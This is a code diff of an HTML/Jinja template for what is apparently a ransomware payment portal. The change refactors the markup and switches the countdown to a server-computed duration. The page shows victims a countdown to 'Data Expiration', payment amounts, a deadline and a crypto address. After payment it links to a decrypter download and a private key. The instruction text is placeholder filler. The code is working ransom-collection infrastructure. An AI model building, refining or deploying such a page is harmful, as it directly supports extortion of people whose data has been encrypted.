@@ -31,20 +31,17 @@
         }
     </style>
 
-    <script>
-        {% if user %}
-            document.addEventListener('DOMContentLoaded', function() {
-                var expirationDate = new Date("{{ user.expiration }}");
-                var now = new Date();
-
-                var duration = expirationDate - now;
+    {% if user %}
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                var duration = {{ remaining_time }};  // directly use the server-calculated duration
 
                 var hoursDisplay = document.querySelector('#hours');
                 var minutesDisplay = document.querySelector('#minutes');
                 var secondsDisplay = document.querySelector('#seconds');
                 var millisecondsDisplay = document.querySelector('#milliseconds');
 
-                var countdown = setInterval(function() {
+                var countdown = setInterval(function () {
                     duration -= 50;
 
                     var hours = Math.floor(duration / (1000 * 60 * 60));
@@ -62,67 +59,69 @@
                     }
                 }, 50);
             });
-        {% endif %}
-    </script>
+        </script>
+    {% endif %}
+
 </head>
 
 <body>
 
-    <div class="container mt-5">
-        <div class="header text-center">
-            <h1>{% if paid_user %}Payment Success{% else %}Data Expiration{% endif %}</h1>
-            {% if user %}
-                <div class="countdown">
-                    <span id="hours">00 hours</span>
-                    <span id="minutes">00 minutes</span>
-                    <span id="seconds">00 seconds</span>
-                    <span id="milliseconds">00 milliseconds</span>
-                </div>
-            {% endif %}
-        </div>
-
-        <table class="table table-striped">
-            <thead>
-                <tr>
-                    <th>User Data</th>
-                    <th>Status</th>
-                </tr>
-            </thead>
-            <tbody>
-                <tr>
-                    <td>Payment status</td>
-                    <td>{{ paid_user.status if paid_user else user.status }}</td>
-                </tr>
-                <tr>
-                    <td>Total Payment</td>
-                    <td>{{ paid_user.total_payment if paid_user else user.total_payment }}</td>
-                </tr>
-                <tr>
-                    <td>Amount Paid</td>
-                    <td>{{ paid_user.amount_paid if paid_user else user.amount_paid }}</td>
-                </tr>
-                <tr>
-                    {% if paid_user %}
-                        <td>Payment Date</td>
-                        <td>{{ date(paid_user.payment_date) }}</td>
-                    {% else %}
-                        <td>Deadline</td>
-                        <td>{{ date(user.expiration) }}</td>
-                    {% endif %}
-                </tr>
-            </tbody>
-        </table>
-
-        <p>Crypto Address: {{ paid_user.crypto_address if paid_user else user.crypto_address }}</p>
-        <hr>
-        <footer>
-            {% if paid_user %}
-                <a href="{{ url_for('download_decrypter', uid=paid_user.uid) }}" class="btn btn-primary">Download decrypter</a>
-                <a href="{{ url_for('download_private_key', uid=paid_user.uid) }}" class="btn btn-secondary">Private Key</a>
-            {% endif %}
-        </footer>
-        <br><br>
+<div class="container mt-5">
+    <div class="header text-center">
+        <h1>{% if paid_user %}Payment Success{% else %}Data Expiration{% endif %}</h1>
         {% if user %}
+            <div class="countdown">
+                <span id="hours">00 hours</span>
+                <span id="minutes">00 minutes</span>
+                <span id="seconds">00 seconds</span>
+                <span id="milliseconds">00 milliseconds</span>
+            </div>
+        {% endif %}
+    </div>
+
+    <table class="table table-striped">
+        <thead>
+        <tr>
+            <th>User Data</th>
+            <th>Status</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+            <td>Payment status</td>
+            <td>{{ paid_user.status if paid_user else user.status }}</td>
+        </tr>
+        <tr>
+            <td>Total Payment</td>
+            <td>{{ paid_user.total_payment if paid_user else user.total_payment }}</td>
+        </tr>
+        <tr>
+            <td>Amount Paid</td>
+            <td>{{ paid_user.amount_paid if paid_user else user.amount_paid }}</td>
+        </tr>
+        <tr>
+            {% if paid_user %}
+                <td>Payment Date</td>
+                <td>{{ date(paid_user.payment_date) }}</td>
+            {% else %}
+                <td>Deadline</td>
+                <td>{{ date(user.expiration) }}</td>
+            {% endif %}
+        </tr>
+        </tbody>
+    </table>
+
+    <p>Crypto Address: {{ paid_user.crypto_address if paid_user else user.crypto_address }}</p>
+    <hr>
+    <footer>
+        {% if paid_user %}
+            <a href="{{ url_for('download_decrypter', uid=paid_user.uid) }}" class="btn btn-primary">Download
+                decrypter</a>
+            <a href="{{ url_for('download_private_key', uid=paid_user.uid) }}" class="btn btn-secondary">Private Key</a>
+        {% endif %}
+    </footer>
+    <br><br>
+    {% if user %}
         <h3>Instructions:</h3>
         <p>
             On the other hand, we denounce with righteous indignation and dislike men who are so beguiled
@@ -137,8 +136,8 @@
             principle of selection: he rejects pleasures to secure other greater pleasures,
             or else he endures pains to avoid worse pains.
         </p>
-        {% endif %}
-    </div>
+    {% endif %}
+</div>
 </body>
 
 </html>
